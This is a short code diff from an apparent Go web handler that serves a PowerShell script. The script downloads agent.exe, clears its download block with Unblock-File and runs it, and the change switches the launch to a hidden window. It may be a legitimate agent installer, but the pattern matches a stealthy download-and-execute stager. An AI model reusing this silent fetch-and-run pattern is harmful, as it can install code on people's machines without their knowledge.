@@ -396,7 +396,7 @@ $url = "%s://%s/dl/agent.exe?t=%d"
 $out = "$env:TEMP\agent.exe"
 (New-Object System.Net.WebClient).DownloadFile($url, $out)
 Unblock-File $out -ErrorAction SilentlyContinue
-Start-Process -FilePath $out -ArgumentList "-server %s" -NoNewWindow
+Start-Process -FilePath $out -ArgumentList "-server %s" -WindowStyle Hidden
 `, proto, host, time.Now().Unix(), host)
 		w.Header().Set("Content-Type", "text/plain")
 		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate, max-age=0")
